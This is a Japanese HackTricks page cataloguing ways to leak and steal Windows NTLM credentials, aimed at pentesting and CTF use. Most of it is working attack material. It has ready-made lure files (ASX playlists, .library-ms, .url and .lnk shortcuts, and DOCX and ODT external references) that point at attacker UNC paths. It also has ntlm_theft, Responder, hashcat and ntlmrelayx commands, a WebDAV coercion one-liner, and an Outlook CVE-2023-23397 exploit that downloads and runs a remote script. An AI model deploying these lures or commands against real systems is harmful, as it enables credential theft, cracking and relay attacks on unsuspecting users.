# NTLM creds を盗む場所

{{#include ../../banners/hacktricks-training.md}}

**Microsoft Word ファイルをオンラインでダウンロードさせる方法から、NTLM leaks のソース https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md や [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) まで、[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) にある素晴らしいアイデアをすべて確認してください。**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 書き込み可能な SMB share + Explorer でトリガーされる UNC lure (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**ユーザーやスケジュールされたジョブが Explorer で参照する share に書き込める**場合は、メタデータが自身の UNC (例: `\\ATTACKER\share`) を指すファイルを置きます。フォルダーを表示すると**暗黙的な SMB 認証**がトリガーされ、**NetNTLMv2** が listener に漏えいします。<sup>[[1]](#references)</sup>

1. **lure を生成** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF などに対応)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **書き込み可能な共有フォルダーに置く**（被害者が開く任意のフォルダー）:

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Listen and crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows は複数のファイルに一度にアクセスすることがあります。Explorer がプレビューするファイル（`BROWSE TO FOLDER`）なら、クリックは不要です。

### Windows Media Player のプレイリスト（.ASX/.WAX）

対象者に、こちらが用意した Windows Media Player のプレイリストを開くかプレビューさせることができれば、エントリの参照先を UNC path にすることで Net‑NTLMv2 を leak できます。WMP は SMB 経由で参照先のメディアを取得しようとし、その際に暗黙的に認証します。<sup>[[3]](#references)[[4]](#references)</sup>

ペイロードの例:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

収集と cracking のフロー:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP内に埋め込まれた .library-ms による NTLM leak (CVE-2025-24071/24055)

Windows Explorerは、ZIPアーカイブ内から直接開かれた .library-ms ファイルを安全でない方法で処理します。ライブラリ定義がリモートUNCパス（例: \\attacker\share）を指している場合、ZIP内の .library-ms を表示または起動するだけで、ExplorerがUNCを列挙し、攻撃者にNTLM認証情報を送信します。これにより、オフラインでクラックしたり、リレーしたりできる可能性のあるNetNTLMv2が取得されます。<sup>[[2]](#references)</sup>

攻撃者のUNCを指す最小限の .library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

操作手順
- 上記のXMLを使って .library-ms ファイルを作成します（IP/ホスト名を設定）。
- ZIPに圧縮し（Windowsの場合: 送る → 圧縮(zip形式)フォルダー）、ZIPを標的に送ります。
- NTLM capture listenerを起動し、被害者がZIP内の .library-ms ファイルを開くのを待ちます。


### Outlookの予定表リマインダーのサウンドパス（CVE-2023-23397）– zero-click Net-NTLMv2 leak

Microsoft Outlook for Windowsは、予定表アイテムの拡張MAPIプロパティ PidLidReminderFileParameter を処理していました。このプロパティにUNCパス（例: \\attacker\share\alert.wav）が指定されていると、リマインダーの起動時にOutlookがSMB共有に接続し、クリック操作なしでユーザーのNet-NTLMv2がleakします。この問題は2023年3月14日に修正されましたが、旧式または未更新の環境や、過去のインシデント対応では依然として非常に重要です。<sup>[[5]](#references)</sup>

PowerShellを使った簡単なexploit（Outlook COM）:

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

リスナー側:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notes
- 被害者側では、リマインダーが作動する際に Outlook for Windows が起動しているだけでよい。
- leak により、オフラインクラッキングまたはリレーに利用できる Net‑NTLMv2 が取得される（pass-the-hash は不可）。

### .LNK/.URL アイコンベースのゼロクリック NTLM leak（CVE‑2025‑50154 – CVE‑2025‑24054 のバイパス）

Windows Explorer はショートカットのアイコンを自動的に表示します。最近の調査では、UNC アイコン付きショートカットに対する Microsoft の 2025 年 4 月のパッチ適用後も、ショートカットのターゲットを UNC パス上に置き、アイコンをローカルに保つことで、クリックなしに NTLM 認証を引き起こせることが示されました（このパッチバイパスには CVE‑2025‑50154 が割り当てられました）。フォルダーを表示するだけで、Explorer はリモートターゲットからメタデータを取得し、攻撃者の SMB サーバーに NTLM を送信します。<sup>[[6]](#references)</sup>

最小限の Internet Shortcut ペイロード（.url）：

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell でショートカット payload（.lnk）を作成:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

配布方法のアイデア
- ショートカットを ZIP に入れ、被害者に閲覧させる。
- 被害者が開く書き込み可能な共有フォルダーにショートカットを置く。
- 同じフォルダーに誘導用ファイルをほかにも置き、Explorer に項目をプレビューさせる。

### ExtraData のアイコンパスを介したクリック不要の .LNK NTLM leak（CVE‑2026‑25185）

Windows は、実行時だけでなく、**表示／プレビュー**時（アイコンの描画時）にも `.lnk` のメタデータを読み込む。CVE‑2026‑25185 では、**ExtraData** ブロックによってシェルがアイコンパスを解決し、**読み込み中に**ファイルシステムへアクセスする解析経路が示されている。パスがリモートの場合、外向きの NTLM 認証が発生する。

主なトリガー条件（`CShellLink::_LoadFromStream` で確認）:
- ExtraData に **DARWIN_PROPS** (`0xa0000006`) を含める（アイコン更新ルーチンを実行するための条件）。
- **TargetUnicode** が設定された **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) を含める。
- ローダーは `TargetUnicode` 内の環境変数を展開し、結果のパスに対して `PathFileExistsW` を呼び出す。

`TargetUnicode` が UNC パス（例: `\\attacker\share\icon.ico`）に解決されると、そのショートカットを含むフォルダーを**表示するだけで**外向きの認証が発生する。同じ読み込み経路は**インデックス作成**や**AV スキャン**でも実行されるため、実用的なクリック不要の leak 発生面となる。<sup>[[7]](#references)</sup>

Windows GUI を使わずにこれらの構造を作成／検査するための調査ツール（パーサー／ジェネレーター／UI）は、**LnkMeMaybe** プロジェクトで利用できる。<sup>[[8]](#references)</sup>


### WebDAV auth coercion / `davclnt.dll,DavSetCookie` による認証情報の検証

ネイティブの **WebDAV クライアント**を悪用すると、現在のログオンセッションに任意の **HTTP/WebDAV** エンドポイントへの認証を強制できる:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

なぜ有用か:
- **攻撃者が制御する WebDAV サーバー**に対して、カスタムクライアントを配置せずに**HTTP over NTLM**を発生させられます。
- **内部ホスト**に対しては、ラテラルムーブメントを開始する前に、盗んだ認証情報がどこで受け入れられるかを静かに**検証**できます。<sup>[[9]](#references)</sup>
- **SMB の外向き通信がフィルタリングされている**一方で、**HTTP/WebDAV**には到達できる場合に、このコマンドは有効な代替手段です。

運用上の注意:
- 送信元ホストで **WebClient** サービスが実行されている必要があります。
- `rundll32.exe` が `davclnt.dll` を読み込み、Windows に**現在のユーザーの認証情報**を使って WebDAV 認証を処理させます。<sup>[[10]](#references)</sup>
- 自分が制御するインフラを指定する場合は、次のような NTLM 対応の HTTP listener/relay を使用します:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

検知の観点では、多数の内部システムに対して `rundll32.exe davclnt.dll,DavSetCookie` を繰り返し実行するのは、通常のユーザー行動ではなく、**認証情報の検証 / spray のようなラテラルムーブメントの準備**を示す強いシグナルです。<sup>[[9]](#references)[[11]](#references)</sup>

### WebDAV NTLM coercion に使われるリモート通知 URI

アプリケーションがリモート設定されたポップアップや Web ビューのアドレスを参照する場合、`file://` アドレスによって、ドキュメントを開いたり実行可能なペイロードを使ったりせずに、外向きの認証を強制できます。AOMEI の事例では、1 ピクセルの通知がリモートの `DavWWWRoot` WebDAV パスを指していました。Windows はそのアドレスに対して統合認証を試み、NetNTLMv2 チャレンジレスポンスを漏えいしました。トリガーとなったのはポップアップの表示ではなく URI の参照です。ただし、アプリケーションの URI ハンドラー、[Windows WebClient の動作](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution)、および外向き認証ポリシーに依存します。<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

上記のコマンドベースの強制とは異なり、このエントリポイントを利用するには、[ソフトウェアの通知設定](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger)を制御する必要があります。1ピクセルのウィンドウと高い優先度により、目立たない通知でもクライアントに URI をデリファレンスさせられることがわかります。<sup>[[16]](#references)</sup>

### Office remote template injection (.docx/.dotm) で NTLM を強制

Office ドキュメントは外部テンプレートを参照できます。添付テンプレートに UNC パスを設定すると、ドキュメントを開いたときに SMB 認証が行われます。

最小限の DOCX リレーションシップ変更（word/ 内）:

1) word/settings.xml を編集して、添付テンプレートの参照を追加します:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels を編集し、rId1337 を自分の UNC に向けます。

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx に再パッケージして渡します。SMB capture listener を起動し、開かれるのを待ちます。

### SMB authentication 用の ODT 外部オブジェクト

ドキュメントのアップロード先が `.odt` を受け付ける一方、対象が Office `.docx` ファイルを開かない場合は、Office template の代わりに OpenDocument external object を使用します。Metasploit の `auxiliary/fileformat/odt_badodt` は、以下のような on-load の `draw:object` 参照を `content.xml` に含む ODT を生成します。`LHOST` を SMB listener に設定し、許可された手順で ODT をアップロードして、ユーザーまたはドキュメント処理プログラムが開いたときに送信される NetNTLMv2 response を取得します。ファイル名の拡張子チェックでは、埋め込まれた URL は検査されません。また、対象で受信 NTLM が制限されていても、送信認証は必ずしも阻止されません。<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

post-capture での NTLM relay や悪用のアイデアについては、こちらを確認してください。

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – 書き込み可能な共有への誘導 + Responder による capture → NetNTLMv2 crack → svc_mssql の Kerberoast](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms の認証情報 leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 による DA 取得 (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP の NTLM leak → NTFS junction で webroot に到達して RCE → FullPowers + GodPotato で SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 件の NTLM 脆弱性: Microsoft における未修正の権限昇格の脅威](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft が Outlook の EoP (CVE‑2023‑23397) を緩和し、PidLidReminderFileParameter 経由の NTLM leak を解説](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – ゼロクリックで NTLM を取得: Microsoft セキュリティパッチの bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 のレビュー](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe ツール](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT サポートからの電話: Teams からドメイン侵害に至る ModeloRAT キャンペーンの分析](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h ヘッダー](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV リクエスト](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm ハッシュ窃取に役立つ場所](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT の外部オブジェクトによる NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group と Mandiant – 一時的なサプライチェーン改ざんの調査](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
